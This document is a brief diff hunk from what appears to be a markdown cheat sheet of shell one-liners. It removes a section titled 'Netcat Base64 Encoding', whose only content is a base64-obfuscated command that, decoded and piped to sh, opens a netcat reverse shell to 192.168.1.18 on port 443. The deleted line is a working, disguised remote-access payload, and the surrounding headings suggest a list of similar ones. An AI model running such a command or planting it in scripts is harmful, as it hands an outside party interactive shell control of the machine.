@@ -195,15 +195,6 @@
   ```
   
   ---
- 
-  # <kbd>Netcat Base64 Encoding</kbd>
- 
-  ```cmd
-  echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjE4IDQ0MyA+L3RtcC9mCg==' |base64 -d |sh
-  ```
- 
-  
-  ---
   
   # <kbd>cURL</kbd>
  
